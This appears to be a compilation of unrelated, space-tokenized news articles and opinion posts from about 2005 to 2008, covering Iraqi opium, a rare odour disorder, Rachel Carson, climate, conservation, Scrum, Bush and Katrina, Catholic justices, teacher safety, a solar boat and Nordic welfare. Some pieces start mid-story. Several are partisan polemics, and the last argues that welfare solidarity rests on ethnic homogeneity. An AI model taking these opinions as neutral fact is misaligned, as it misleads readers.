Farmers in southern Iraq have started to grow opium poppies in their fields for the first time , sparking fears that Iraq might become a serious drugs producer along the lines of Afghanistan .
Rice farmers along the Euphrates , to the west of the city of Diwaniya , south of Baghdad , have stopped cultivating rice , for which the area is famous , and are instead planting poppies , Iraqi sources familiar with the area have told The Independent .
The shift to opium cultivation is still in its early stages but there is little the Iraqi government can do about it because rival Shia militias and their surrogates in the security forces control Diwaniya and its neighbourhood .
There have been bloody clashes between militiamen , police , Iraqi army and US forces in the city over the past two months .
The shift to opium production is taking place in the well - irrigated land west and south of Diwaniya around the towns of Ash Shamiyah , al Ghammas and Ash Shinafiyah .
The farmers are said to be having problems in growing the poppies because of the intense heat and high humidity .
It is too dangerous for foreign journalists to visit Diwaniya but the start of opium poppy cultivation is attested by two students from there and a source in Basra familiar with the Iraqi drugs trade .
Drug smugglers have for long used Iraq as a transit point for heroin , produced from opium in laboratories in Afghanistan , being sent through Iran to rich markets in Saudi Arabia and the Gulf .
Saddam Hussein 's security apparatus in Basra was reportedly heavily involved in the illicit trade .
Opium poppies have hitherto not been grown in Iraq and the fact that they are being planted is a measure of the violence in southern Iraq .
It is unlikely that the farmers ' decision was spontaneous and the gangs financing them are said to be " well - equipped with good vehicles and weapons and are well - organised " .
There is no inherent reason why the opium poppy should not be grown in the hot and well - watered land in southern Iraq .
It was cultivated in the area as early as 3,400BC and was known to the ancient Sumerians as Hul Gil , the " joy plant " .
Some of the earliest written references to the opium poppy come from clay tablets found in the ruins of the city of Nippur , just to the east of Diwaniya .
There has been an upsurge in violence not only in Diwaniya but in Basra , Nassariyah , Kut and other Shia cities of southern Iraq over the past 10 days .
It receives limited attention outside Iraq because it has nothing to do with the fighting between the Sunni insurgents and US forces further north or the civil war between Shia and Sunni in Baghdad and central Iraq .
The violence is also taking place in provinces that are too dangerous for journalists to visit .
Aside from Basra , few foreign soldiers are killed .
The fighting is between rival Shia parties and militias , notably the Mehdi Army , who support the anti-US cleric Muqtada al - Sadr , and the Badr Organisation - the military wing of the recently renamed Supreme Islamic Iraqi Council ( SIIC ) .
In many , though not all , areas of southern Iraq , the latter group controls the police .
The intra-militia violence in southern Iraq is essentially over control of profitable resources and the establishment of power bases .
According to one report the violence in Diwaniya has been escalating for two months and was initially motivated by rivalry over control of opium production but soon widened into a general turf war .
The immediate cause of the fighting in Diwaniya that began on 16 May was the arrest of several members of the Mehdi Army .
Other militiamen tried to rescue them and attacked the police ( whom the Sadrists say are controlled by the SIIC ) .
Troops from the Iraqi army and the US army were drawn into the fighting .
The Sadrists sent 200 men as reinforcements into the city .
Some 11 people , eight of them civilians , were killed on a single day .
An American soldier was killed and two wounded in a Mehdi Army attack on Saturday .
Diwaniya 's Governor , Khaleel Jaleel Hamza , who has moved his family to Iran for safety , announced " a pact of honour " to end the fighting on Monday .
The agreement provides for foreign forces to be kept out of the city .
As in Afghanistan after the fall of the Taliban in 2001 , these conditions of primal anarchy are ideal for criminal gangs and drug smugglers and producers .
The difference is that Afghanistan had long been a major producer of opium and possessed numerous laboratories experienced in turning opium into heroin .
The Taliban , on the orders of its leader , Mullah Omar , had stopped its cultivation by farmers in the parts of Afghanistan it controlled .
Farmers near the southern city of Kandahar grubbed up cauliflowers and planted poppies instead as soon as the US started bombing .
The grip of the British Army around Basra and other southern provinces was always tenuous and is now coming to an end .
Although the government in Baghdad speaks of gradually taking control of security in the provinces from US and Britain , the winners in the new Iraq are the militia , often criminalised , that have colonised the Iraqi security forces .
Diwaniya is in Qaddasiyah province , which was never under British control but the pattern in all parts of Shia Iraq is very similar .
The one factor currently militating against criminal gangs organising poppy cultivation in Iraq on a wide scale is that they are already making large profits from smuggling drugs from Iran .
This is easy to do because of Iraq 's enormous and largely unguarded land borders with neighbouring states .
Iraqis themselves are not significant consumers of heroin or other drugs .
But it is evident from the start of opium production around Diwaniya that some gangs think there is money to be made by following the example of Afghanistan .
Given that they can guarantee much higher profits from growing opium poppies than can be made from rice , many impoverished Iraqi farmers are likely to cultivate the new crop .

The Model Who Smells Like Dead Fish
One woman 's struggle with a rare disorder that produces a fishy smell .
March 7 , 2008  -- Editor 's note :
This story originally aired on " Primetime " on Aug. 9 , 2006 .
Camille has beauty and brains .
She 's a former model and a Phi Beta Kappa with a master 's in education .
There 's a part of her , though , that 's not so perfect .
She smells like spoiled fish .
Camille says when she taught , students would n't come near her .
" They would say things like , ' Ew , this classroom stinks like dead fish . '
They would call me ' Miss Fishy . ' "
She asked that her last name not be used because telling her story was difficult for her .
Camille described the odor as " a very heavy , intense , dark , deep smell . "
" I did n't know why I was emitting such a strong odor .
I mean , it can fill an entire room .
Recently , it filled an auditorium , " Camille said .
Her job as a teacher became excruciating .
" I was so focused on ' Do I smell ?
Do I smell ?
Are they saying things ?
Are they whispering ?
Are they laughing about me ? ' "
Smell Can't Be Covered
No matter what she does , Camille says she can't cover the smell .
Neither showers nor perfume helps .
Camille has a medical mystery that she 's struggled to understand for nearly 30 years .
It took her self - esteem and was taking her profession .
She says she was often in a state of panic .
" I would open windows .
I would leave the door open .
I 'd put fans in my classrooms .
I mean the whole nine yards , " Camille said .
She also felt a tremendous amount of pain .
" I would cry all the way home from school .
All the time . "
Her childhood was no easier because Camille 's ordeal began in first grade .
" One of my teachers asked me if I was showering every day .
From that point on , she kind of sat me in the corner of the classroom .
Kids would call me a freak .
They would tell me I smelled like horse manure [ and ] dead fish . "
We 're instinctively programmed to stay away from the smell of dead fish because it helps keep us from eating spoiled or dangerous food .
That unpleasant odor is what Camille smelled like .
Even worse , she could n't detect the smell on herself so she never knew when it was out of control .
It made for a humiliating childhood .
" I had an incident in middle school where a bunch of kids cornered me in the cafeteria and threw tuna fish sandwiches at me , " Camille said .
Rejected by the Adult World
When Camille got older , the insults continued .
One of her first jobs was as a teller in a credit union .
" My supervisor would come by and spray my area with perfume , Lysol , and they put me in the drive - through section , which is separate from the rest of the teller area , " Camille said .
Her social life was just as painful .
She dated on and off .
If a man got too close to her , she says she felt like she had to let him go because he deserved better than her .
" I always thought , ' I 'm a freak . '
You start to see yourself as not quite human . "
Her life became more and more isolated -- she went out only when absolutely necessary .
Solving the Smell
She went to doctor after doctor , including specialists like internists and gynecologists .
No one could help .
Just months after Camille started her dream teaching job , she quit under the strain .
She thought about suicide .
" You feel incredibly helpless and hopeless .
Tired of being ridiculed and feeling like a freak .
So I 'm going to take my life . "
Fortunately , while in a deep depression , Camille found her answer on the Internet .
" All I did was type in ' fishy body odor , ' then this one thing came up , trimethylaMinuria .
They 're saying that this chemical , trimethylamine , comes out of your body , and smells like dead fish . "
Another computer click brought up the TMAU -- an acronym for the disorder -- Foundation .
Sandy , the organization 's founder , also suffered from the disorder , and she did n't know it for years .
In fact , she remembers once calling the maintenance man to her New York City apartment to check her bathroom .
" It just smelled horribly .
I thought maybe there was some kind of a problem with the sewer , " Sandy said .
It was n't the sewer , it was Sandy .
She did n't put two and two together until a co-worker explained why everyone was complaining about the bad smell in the office .
Sandy says her co-worker told her , " Sandy , I have to tell you that it 's coming from you . "
Her search for that elusive TMAU diagnosis took years and her life savings .
Sandy says she spent $ 27,000 .
She says she even had " eight different unnecessary and unwarranted surgeries . "
Finally , a dentist suspected Sandy had TMAU , based on the smell of her breath , and sent her to Dr. George Preti of Philadelphia 's Monell Chemical Senses Institute .
Preti is an expert in the rare genetic disorder , with only 600 documented patients in the world .
In these people , a faulty enzyme causes the buildup of a chemical called TMA , which smells like dead fish .
" It 's a volatile chemical .
It will come out through the lungs .
It 'll get into your sweat , your spit and other body secretions .
So that 's how it imparts its odor to the individual who has this disorder , " Preti said .
Just about every food available can lead to the buildup of TMA : eggs , meats , beans , milk , cheese , bread and fish .
" The odor will vary from time to time in accordance with the patient 's diet , " Preti said .
Diagnosing Camille
To diagnose Camille , Preti performed tests to check her TMA levels , which were sky high .
Camille is an extreme case .
Her diet is now restricted to foods that can't be converted to TMA to try to minimize the odor .
That leaves her cupboards and refrigerator almost bare .
She has developed other habits keep the odor at bay .
She takes chlorophyll tablets every day .
She showers often .
" I wash with several different products , and I scrub very hard .
I use two different kinds of deodorant and a lot of perfume .
Before I actually leave the house , I spray all of my clothes with Febreze just all up and down , and I also spray my feet and my socks with the deodorant for my feet , " Camille said .
Finding Out You 're Not Alone
In her whole life , she had never met anyone like herself .
That was until " Medical Mysteries " introduced her to Sandy .
Sandy showed Camille all the " useless medications " she had been prescribed over the years for conditions she did n't have .
Sandy says she hopes her TMAU Foundation will help fund research for the orphaned disorder .
As for Camille , she wants doctors and the public to know about TMAU , and to devise a school curriculum to help children who are " different " not be ridiculed as she once was .
Republican environmental critic blocks honors for Rachel Carson , author of Silent Spring Michael Roston
Published : Tuesday May 22 , 2007 Print This Email This Note : Correction appended .
A Republican Senator known for his criticism of various environmental causes is single - handedly holding up two bills in the US Senate that would honor the life of Rachel Carson , author of the well - known book Silent Spring , RAW STORY has learned .
The bills were introduced by a bipartisan group of Senators from Carson 's home - states of Pennsylvania and Maryland on the occasion of the centennial of her birthday on May 27 .
" This week , Dr. Coburn blocked two bills intended to honor Rachel Carson on the 100th anniversary of her birth ( one bill to name a post office after her in PA , and a resolution honoring her ) , " said a press release at Senator Tom Coburn 's ( R - OK ) website .
Coburn said through a spokesman that Carson was undeserving of honor from Congress because she had promoted ' junk science . '
" Dr. Coburn believes the tremendous harm Carsons junk science claims about DDT did to the developing world overshadow her other contributions , " said spokesman John Hart in an e-mail to RAW STORY .
" Millions of people in the developing world , particularly children under five , died because governments bought into Carsons junk science claims about DDT .
To put it in language the Left understands , her ' intelligence ' was wrong and it had deadly consequences . "
One of the resolutions Coburn is blocking with a parliamentary ' hold ' seeks to mark the 100th birthday of Carson , who died in 1964 .
" Congress honors the life of Rachel Carson , a scientist , writer , and pioneer in the environmental movement , on the occasion of the centennial of her birth , " reads the resolution , which was introduced by Senator Ben Cardin of Maryland where Carson spent much of her life , and also co-sponsored by Senator Barbara Mikulski .
Senators Arlen Specter , a Republican , and Democrat Bob Casey , from Pennsylvania where Carson was born , were also co-sponsors , as well as Senator Barbara Boxer ( D - CA ) , who chairs the Senate Environment & Public Works Committee .
Their resolution recognizes Silent Spring for detailing " how synthetic chemicals accumulate in water , soils , fish , and animals , including birds , " and for pushing President John F. Kennedy to convene a scientific panel whose findings led " to the domestic ban of the sale of the chemical [ DDT ] in 1972 , an action that many credit with saving the bald eagle from extinction . "
The resolution also notes that Carson 's book " is credited with helping to launch the modern environmental movement . "
Coburn 's action is part of an ongoing scientific and public health controversy over the use of the pesticide DDT , which the World Health Organization recently approved for limited use in order to prevent the spread of malaria in developing countries .
" This book was the catalyst in the deadly worldwide stigmatization against insecticides , especially DDT , " said Senator Coburn at his website .
" The U.S. and western European countries all used DDT in the mid-20th century to eliminate malaria from their territories , but then banned the substance for use by poor countries today to combat their number one health threat . "
Dr. Diana Post , President of the Rachel Carson Council , was critical of Coburn 's message that there was no reason to celebrate Carson 's life .
" It 's very important today that she linked human health and the impacts of pesticides on wildlife and plants and we know that today , " Dr. Post explained .
She added , " Rachel also pointed out to us that all of those aspects of the environment are important , and that we need to have better a relationship with the environment . "
Another researcher also explained to RAW STORY that Carson 's scientific insights made her life deserving of celebration .
" She had important insights about the importance of interdisciplinary approaches to environmental health , and she was one of the first to point to the importance of linking the effect of pesticides on wildlife with human health and I think that 's a very key insight that is important today in the study of endocrine disrupting compounds , " argued Dr. Julie Brody , who directs the Silent Spring Institute , a non-profit group that identifies links between the environment and women 's health , especially breast cancer .
Even some critics of Carson 's work recognized that her book had beneficial results .
Ronald Bailey , the science correspondent for the libertarian magazine Reason , has been critical of the quality of Carson 's scientific research and favors the limited use of DDT for anti-malaria purposes .
He told RAW STORY in a phone interview Tuesday that there had nevertheless been some positive benefits from Silent Spring .
" To a certain extent , she launched a movement based on bad science that nevertheless had good results , " Bailey argued , explaining that Carson had essentially become a ' myth . '
" Let 's face it , Americans needed to be alerted to problems of pollution , and there 's value in that , " he added .
Dr. Post from the Rachel Carson Council also suggested that Carson effectively saved the chemicals industry from itself .
" Many people , people who were not even anti-pesticide , said that what Rachel Carson did probably saved the pesticide industry from further radical complaints or actions against it , because if things had been allowed to go on as they were , there would have been real trouble in the future , " she explained But Senator Coburn 's spokesman was adamant that he 'd maintain his parliamentary hold , which will prevent the casting of votes in favor of the resolution .
" [ Senate Majority Leader Harry ]
Reid could easily break this hold with procedural votes .
The sponsors should ask Senator Reid why he wont put it on the floor if this is a vital effort , " Hart wrote in his e-mailed response to RAW STORY 's questions .
Correction : RAW STORY mistakenly identified Senator Coburn as squaring off with former Vice President Al Gore on the science behind the cause of climate change , confusing him with his Oklahoma colleague Senator James Inhofe .
RAW STORY regrets the error .
MONTREAL – Global warming is accelerating and exceeding the most pessimistic predictions , the executive secretary of the United Nations Framework Convention on Climate Change said Tuesday .
Yvo de Boer cited a new U.S. National Academy of Sciences study which stated carbon dioxide emissions have increased by 3.1 per cent per year between 2000 and 2004 where they had only increased 1.1 per cent per year during the 1990s .
" That takes you well beyond the worst case scenario of the intergovernmental panel on climate change , " de Boer told an audience in a speech to mark international biodiversity day .
" To use a bad analogy , climate change is now in overdrive . "
The Dutch diplomat stressed the urgency of the situation and said the energy needs of the planet require total investments of US $ 20 trillion during the next 20 years .
" If we invest that $ 20 trillion badly , in the absence of political direction , CO2 emissions will increase by 60 per cent by 2030 instead of decrease globally by 60 per cent in 2030 . "
De Boer noted that a new coal - fired power station opens every three to five days in China without any kind of environmental policy .
Earlier this month , de Boer criticized the federal government 's environmental plan as being less ambitious than the Kyoto protocol on climate change but was more diplomatic on Tuesday with Environment Minister John Baird at his side .
Ottawa 's plan is ambitious , he said , " but it 's not enough to meet Kyoto commitments in 2012 , " he said .
" That 's a statement of fact , not a criticism . "
Baird , for his part , blamed the previous Liberal government for inaction on the environment .
Other concerns about the environment were also voiced at the conference .
Ahmed Djoghlaf , executive secretary of the biological diversity convention , said that about 100 plant and animal species disappear each year , mainly due to climate change .
He pointed out that the species are key to helping the planet adapt to climate change .
The federal government announced Tuesday a $ 4.5 million program to protect endangered species and their habitats although Baird was unable to say exactly how the money would be spent .

His feat , loosely billed as a record , has also alarmed the scientists , who say it shows that coastal islands cleared of rats can easily be reoccupied .
Mick Clout , Professor of Conservation Ecology at the University of Auckland , said yesterday Razza was taken to Motuhoropapa , a flyspot east of Auckland , for a study on how a rat behaves when alone on an island .
" We assume most rat invasions begin with one or two rats coming ashore , probably from ships , " Professor Clout said .
Researchers wanted to know how hard it would be to spot a single invader , and how difficult it would be to capture .
Razza had a small radio transmitter attached and was set free on the island .
Scientists intended to recapture him within eight weeks , but Razza gave a new meaning to " rat cunning " .
He avoided all the scientists ' traps , and after 10 weeks his radio signal failed .
" It would be fair to say that at that point we were worried , " Professor Clout said .
The Conservation Department was also worried , as the island had been cleared of rats .
Two weeks after the transmitter failed a woman reported finding rat droppings on Otata , a rat - free island 400 metres from Motuhoropapa .
DNA tests confirmed they were Razza's .
" To our knowledge this is the first record of a rat swimming across open sea , and it's often quite rough water , " Professor Clout said .
" We assume he did it deliberately , but who knows what was in his mind ? "
He speculated that Razza may have wanted female company .
A trap on Otata finally ended Razza 's four months of freedom , and his life .
His adventures are detailed in today 's Nature .
In his recently published " Scrum and XP From the Trenches [ pdf ] , " Henrik Kniberg of Crisp gives a comprehensive description of how he implemented a mix of Scrum and XP practices for a development team of 40 people .
Similar to other books and experience reports , Henrik discusses such topics as :
Running a sprint planning meeting
Managing the product and sprint backlogs
Coaching the daily scrum
Integrating testers with the development team
The sprint goal may seem rather silly and contrived during the sprint planning , but it often comes to use in mid-sprint , when people are starting to get confused about what they should be doing .
If you have several Scrum teams ( like we do ) working on different products it is very useful to be able to list the sprint goals of all teams on a single wiki page ( or whatever ) and put them up in a prominent space so that everybody in the company ( not only top - level management ) knows what the company is doing - and why !
I 've probably given you the impression that we have testers in all Scrum teams , that we have a huge acceptance test team for each product , that we release after each sprint , etc. , etc .
Well , we do n't .
We 've sometimes managed to do this stuff , and we 've seen that it works when we do .
But we are still far from an acceptable quality assurance process , and we still have a lot to learn there .
In addition to this , however , Henrik goes on to describe some of the more difficult - and rarely covered - aspects of working in an agile organization , including coordinating the efforts of multiple Scrum teams .
Throughout , Henrik includes advice and observations :
The paper often discusses multiple approaches that were tried for a problem , pointing out what worked and what did n't .
Henrik also is n't afraid to point out areas in which his team could have done better :
“ It is better to have enough ideas for some of them to be wrong , than to be always right by having no ideas at all . ” – Edward de Bono
Most people will spend hundreds of hours and thousands of dollars trying to keep a favorite business baby breathing .
Yet studies say ( and my experience confirms ) that it ’s almost never a good idea .
After the time and money has been invested , the patient dies anyway .
Take Microsoft co-founder Paul Allen .
Between 1999 and 2004 , he learned the hard way about the futility of pumping money into a failing business venture .
According to Business Week ,
Allen lost at least a third of his $ 30 billion fortune after five years of funneling money into tech and media companies that he believed could fulfill his “ Wired World ” concept of merging the Internet , cable TV , and entertainment .
Of course , because of the tech bust and resistance from some of the individual companies he had invested in , it was evident early on that the “ Wired World ” would not come about , but Allen could not let his pet project go until he ’d lost billions .
How can you protect yourself from losing all your cash to a much - loved idea ?
The smart thing to do is simple :
Give your great idea a good test – as quickly and as inexpensively as you can .
If it fails , discontinue it immediately .
That advice is sometimes hard to follow , because your ego – as well as the hard work and care of everyone who helped you make it happen – is invested in the project .
In fact , according to a study by Eyal Biyalogorsky , William Boulding , and Richard Staelin of Duke University ’s Fuqua School of Business , when presented with a case history of a hypothetical business project and given the choice of proceeding or shutting down , 52 percent of managers decided to keep the project going despite all the negative information they were given .
One reason for this tendency , the researchers conjecture , is that decision - makers distort negative information until it seems like a good idea to keep moving forward .
A manager ’s initial positive feelings about a project overpower any problems that crop up .
Even though it ’s difficult to kill something you care about , something into which you ’ve invested time and money , sometimes it just has to be done .
A partner of mine and I recently had the sad task of putting to rest a business idea on which a small group of people had worked very hard .
It was especially difficult in this case , because the “ father ” of the project was a friend of ours .
He had given his all to get this baby going and was hoping it would be his big break , the opportunity for which he ’d been waiting years .
It would have been a very difficult process – killing the project and telling him that we were doing it – but we had prepared him ( and ourselves ) by following some of the rules suggested below .
As a result , we were able to do the nasty deed quickly and painlessly .
The most important thing is to establish a serious benchmark in the very beginning , before launching the project .
Using the data you have from past new - product launches , determine what sort of targets you want to set .
If all previous successful launches began with a sales - response rate of five percent , for example , you should make your benchmark five percent or more .
Why ?
Because things never seem to turn out as well as we hope they will – especially when those things are ideas we want to believe in .
Set a conservative benchmark and then get all team members to agree that if you do n’t reach it , you wo n’t go forward .
If you can set two or three criteria for judging the project – two or three benchmarks – that would be even better .
But be sure you have a way to average all the benchmarks or some other way to make the go - forward decision automatic .
Throughout the early stages of a project , do everything you can to ensure the best possible outcome – but , all the while , remind your teammates ( and yourself ) that the market is sometimes enigmatic .
Work for success but recognize the possibility of failure .
If the project does fail , thank everyone who worked on it .
Thank them as a group and individually .
Have a post - mortem meeting to figure out what went wrong and what might be done differently “ next time . ”
Make it very clear :
Stopping this project is not the end of the world .
In fact , by cutting it short , you have more time , energy , and resources to test another project , one that might succeed .
Let everyone who worked on the project know that although you are sad that it did n’t work out , you are optimistic .
You will find something that will succeed .
If you pushed to have the project launched against everyone ’s warnings not to , admit responsibility but do n’t apologize and do n’t act guilty .
Idea leaders ( people who come up with new ideas or promote them ) are important not because they are always right but because they are so often willing to do what others would rather not even try .
Act upbeat , especially if you do n’t feel upbeat .
Remind yourself that most of the greatest business leaders , like the greatest athletes and entertainers , failed more often than not .
Keeping an upbeat way about you will do more than anything else to improve morale .
Consider holding an Irish Wake .
Invite team members to a pub to dance and sing and to tell stories about the dearly departed .

How many places will be in shambles by the time the Bush crew leaves office ?
Given that the Bush team has dealt with both gulf crises , Iraq and Katrina , with the same deadly mixture of arrogance and incompetence , and a refusal to face reality , it 's frightening to think how it will handle the most demanding act of government domestic investment since the New Deal .
Even though we know W. likes to be in his bubble with his feather pillow , the stories this week are breathtaking about the lengths the White House staff had to go to in order to capture Incurious George 's attention .
Newsweek reported that the reality of Katrina did not sink in for the president until days after the levees broke , turning New Orleans into a watery grave .
It took a virtual intervention of his top aides to make W. watch the news about the worst natural disaster in a century .
Dan Bartlett made a DVD of newscasts on the hurricane to show the president on Friday morning as he flew down to the Gulf Coast .
The aides were scared to tell the isolated president that he should cut short his vacation by a couple of days , Newsweek said , because he can be " cold and snappish in private . "
Mike Allen wrote in Time about one " youngish aide " who was so terrified about telling Mr. Bush he was wrong about something during the first term , he " had dry heaves " afterward .
The president had to be truly zoned out not to jump at the word " hurricane , " given that he has always used his father 's term as a reverse playbook and his father almost lost Florida in 1992 because of his slow - footed response to Hurricane Andrew .
And W.'s chief of staff , Andy Card , was the White House transportation secretary the senior President Bush sent to the rescue after FEMA bungled that one .
W. has said he prefers to get his information straight up from aides , rather than filtered through newspapers or newscasts .
But he surrounds himself with weak sisters who do n't have the nerve to break bad news to him , or ideologues with agendas that require warping reality or chuckleheaded cronies like Brownie .
The president should stop haunting New Orleans , looking for that bullhorn moment .
It 's too late .
There 's a growing brouhaha over the fact that some commentators have noted that 5 of the 9 US Supreme Court justices are Catholic , and all 5 sided against a woman 's right to choose in their latest decision released last week .
" All five justices in the majority in Gonzales are Catholic , " wrote Geoffrey Stone , now a professor at the [ University of Chicago ] law school , in a faculty blog .
" The four justices who either are Protestant or Jewish all voted in accord with settled precedent .
It is mortifying to have to point this out .
But it is too obvious , and too telling to ignore . "
You know what concerns me ? "
O'Donnell asked last week on ABC's " The View . "
" How many Supreme Court judges are Catholic ? "
" Five , " said host Barbara Walters .
" Five , " O'Donnell said .
" How about separation of church and state in America ? "
Walters counseled against drawing conclusions , saying , " We can not assume that they did it because they 're Catholic . "
But O'Donnell had more to say .
" If men could get pregnant , " O'Donnell said , " abortion would be a sacrament . "
" ' The View's ' Rosie O'Donnell continues on her tear down the path of the Rich and Unhinged , this time with an anti-Catholic rant against the Supreme Court , " Ingraham wrote on her Web site .
" Could she ever get away with denigrating the Muslim faith this way ? "
" The Supreme Court did not ' follow marching orders ' from the Vatican or the bishops in the United States , " [ James ] Cella [ president of the Catholic - based organization Fidelis ] said .
" Instead , the court deferred to deliberative judgment of the people 's elected representatives protected by the Constitution . "
Galvanized by battles against same - sex marriage and stem cell research and alarmed at the prospect of a President Kerry - who is Catholic but supports abortion rights - these bishops and like - minded Catholic groups are blanketing churches with guides identifying abortion , gay marriage and the stem cell debate as among a handful of " non-negotiable issues . "
In an interview in his residence here , Archbishop Chaput said a vote for a candidate like Mr. Kerry who supports abortion rights or embryonic stem cell research would be a sin that must be confessed before receiving Communion .
" If you vote this way , are you cooperating in evil ? " he asked .
" And if you know you are cooperating in evil , should you go to confession ?
The answer is yes . "
This spring , a handful of bishops , including Archbishop Raymond Burke of St. Louis , proclaimed that Catholic presidential candidate John Kerry should not present himself for Communion because his public votes defy the core teachings of his church .
Kerry is an adamantly pro-choice Democrat who says he personally opposes abortion .
Catholic advocacy groups ( I suspect conservative ones ) , and conservative shock jocks like Laura Ingraham , are outraged , though it 's not exactly clear about what .
They claim that such observations - namely , that one 's faith may influence one 's decisions in life and on the job , bigoted .
They 're also upset with Rosie O'Donnell ( though this tends to be simply because she 's a lesbian and a Democrat - conservatives do n't think lesbians , nor Democrats , should be permitted in public life ) :
And here is how shock jock Laura Ingraham responded :
Well , first off , conservatives denigrate Islam every single day and still have their jobs - from the former president of the Southern Baptist Convention who called Muhammad a " demon - possessed pedophile , " to Franklin Graham who called Islam evil , to conservative CNN hosts who have labeled all Muslim - Americans as terrorists .
So Ingraham should spare us the crocodile tears about how Muslims get away with everything .
They 're attacked left and right by Ingraham 's buddies every single day , with impunity .
But getting to Ingraham 's larger point , that mentioning the separation of church and state , and the issue as to whether one 's Catholic faith influences a judge 's decision , is " bigotry , " how so ?
What exactly about that point is bigoted ?
Clearly standing up for the doctrine of the separation of church and state is n't bigoted .
Then Ingraham must mean that it is ludicrous to suggest that a Catholic , or any judge of faith , would let their faith influence their court decisions .
I think it 's ludicrous to suggest otherwise , and actually rather religion - phobic to boot .
Is Ingraham suggesting that Christians somehow check their morality at the door when they get on the job ?
That we wo n't murder , covet our neighbor 's wife , cheat or steal at home , but on the job we 'll do it because , you know , we check our religion - based morality at the door from 9 - 5 ?
That 's absurd .
And it also has a deny - me - three - times quality to it .
Yet that is exactly what the Catholic activists are now claiming - that their faith would never influence any decisions they 'd make in their lives .
Huh ?
Again , that 's absurd .
And we know it 's absurd because the religious right and conservative Catholics have been trying to get their people in positions of power for years .
Why ?
Because of their SAT scores or because of their faith ?
Uh , duh .
Of course conservative Christians want their own people in positions of power .
They believe - they KNOW - that their religious beliefs form the basis of their morality , and their morality forms the basis of their daily actions and decisions on the job .
Yet now they'd have us believe that it 's simply not true .
And to revisit the quote above about no one taking marching orders from the Vatican or the American bishops .
Then why do the Vatican and the American bishops GIVE such marching orders to American politicians and the voting public , if no one is expected to follow them , and if such marching orders are somehow bigoted ?
Catholic leaders have told their followers how to vote based on their religion
Or this : Yes , no marching orders from that Catholic bishop .
Then there was the time that the American Catholic bishops said that presidential candidate John Kerry could n't receive communion Yes , no attempt to influence politics there .
Far - right conservatives can't have it both ways .
They can't demand that their elected and appointed officials obey church doctrine on the job , then turn around and call anyone a bigot who notes that those elected and appointed officials are obeying church doctrine on the job .
And let 's not forget that the entire basis of the religious right in America , and conservatives generally , is a world - view based on the Bible AND a political view that demands that Biblical norms be enacted in legislation .
The first thing that comes out of their mouths when debating civil rights legislation for gays and lesbians is God .
Yet , if we note that fact , we 're the bigots .
So which one is it ?
Do far - right conservatives agree or disagree with the church , and religious right activists , telling our political and judicial leaders how to act on the job ?

BBC News , at the ATL conference
The ATL said bad behaviour was rampant
A third of teachers in the UK have faced physical aggression from pupils , a survey for the Association of Teachers and Lecturers ( ATL ) suggests .
And more than half have known of colleagues who had left teaching because of poor pupil behaviour .
This week , increased powers to enable teachers to restrain disruptive pupils came into force in England .
The ATL teachers ' union , which is meeting for its annual conference in Bournemouth , is warning of " rampant " bad behaviour in classrooms .
Teachers blamed a " lack of parental guidance " for this widespread lack of respect for school staff .
A pupil hit me and I reported it to the head teacher , but she made me feel I was in the wrong
ATL survey respondent
And the union warned that the " inclusion " of such disruptive pupils in mainstream classes could damage the chances of other pupils .
The ATL said it surveyed primary , secondary and further education teachers in England , Wales , Northern Ireland and Scotland between 20 February and 9 March .
It found that many staff had to face intimidation , threats and physical attacks from pupils .
Verbal insults and threats had been experienced by 61 % of teachers and 34 % had been subjected to " physical aggression " .
The survey found that 10 % of teachers had suffered " physical harm " as a result of such attacks and 35 % had suffered from " mental health problems " .
Such behaviour problems had caused 56 % of teachers to consider leaving the profession - and 54 % reported knowing a colleague who had left teaching because of pupil indiscipline .
And teachers complained that they did not always receive adequate support .
Extra powers
The union cited the experience of an unnamed primary school teacher in Wiltshire who said : " A pupil hit me and I reported it to the head teacher but she made me feel I was in the wrong . "
This week , teachers have been given extra powers to restrain violent pupils , with new laws coming into effect .
They explicitly state that teachers have the right to physically restrain and remove unruly pupils and impose detention .
Fees issue
A spokesman for England 's Department for Education and Skills said the new powers gave heads and teachers " clear , statutory powers enabling them to deal with poor behaviour swiftly and decisively " .
" Heads have never had such a range of disciplinary and preventative measures at their disposal , along with clear guidance on how to use them .
" They will now be able to send out a strong message to trouble - makers that if they misbehave , they can expect to be punished . "
He added that strong discipline was crucial , but could only work along side responsible parenting and effective teaching on moral issues .
Another survey published on Tuesday by the ATL found that top - up fees could deter students from entering teaching .
And it warned that the cost of training could make teaching an increasingly middle class profession .
Yesterday , videographer Kelly Loudenberg headed out to check out a visitor to New York .
She writes :
Yesterday afternoon the Swiss vessel , Sun21 , arrived into New York 's North Cove Marina after completing a 7,000 mile journey across the Atlantic .
And before you say , " So , what ? " think about this :
The Sun21 made it here without a drop of oil .
The Swiss - built solar - powered catamaran left continental Europe on December 3 , 2006 and arrived in Martinique on February 2nd .
It then traveled up to New York through March and April .
The shipbuilder , Mark Wüst , says , " It 's important for the next generation .
We bring some solutions for the problems we have now .
It 's a small boat , but we can build it bigger . "
ECONOMIST
Tyler Cowen is visiting Denmark , munching herring and musing on the Scandinavian welfare state :
Does immigration bring Nordic welfare states to the verge of collapse ?
They all seem to think so , but I 've long found this fear puzzling .
These states could solve many of their fiscal problems by either cutting taxes / spending a few percentage points , or by moving to complete dual benefit status ( read : non-whites receive less money ) .
No matter what you think of those ideas , they would stave off fiscal crisis .
The trick is that Americans and many of the Nordics have such different senses of what counts as a major political problem .
For better or worse , we are used to tolerating waste and disorder .
They fall apart if even a single piece of the machinery of government is out of order .
( Similarly , the Japanese are aghast over tiny tears in the fabric of social order . )
So if someone is collecting benefits " who should n't be , " it threatens their entire basis of social and legal organization .
I , as a New Jersey - bred American think " too bad , but big deal , what else is new ? "
Would it help them to be more like me ?
Can they simply overlook these instances of immigrant abuse ?
Maybe not .
If they were more like me , they would n't be them in the first place .
I diagnose the issue as a a cultural disconnect between the ostensible justification for the welfare state , and the actual operation .
The conscious justification is " We need to take care of the needy " .
But of course , if this were the actual logic , no Western government would spend any money on domestic poverty programmes ; they would ship all the money abroad to countries where poverty is really dire , and let the people at home , who at least have things like clean water to drink , shift for themselves .
The actual pattern of thought is " We need to take care of our needy compatriots " , with a much weaker " We 'd like to take care of other needy people , money and time permitting " .
But note that there are two definitions of " compatriots " .
One is " people who share my culture and heritage " ; the other is " people who are legally entitled to live ( and / or vote ) within the geographic and political boundaries of my country " .
Citizens tend to respond most deeply to the first sort of logic , but politicians , unsurprisingly , respond to the second .
The welfare state is a means of expressing solidarity with people who are mostly just like you are .
Other people with different values cannot be trusted not to abuse the system ; worse , they do n't much care what you think of them , and so they are immune from the social pressure that regulates consumption of benefits in homogenous communities .
In Scandinavia , luckily , the two definitions of " compatriot " largely describe the same group .
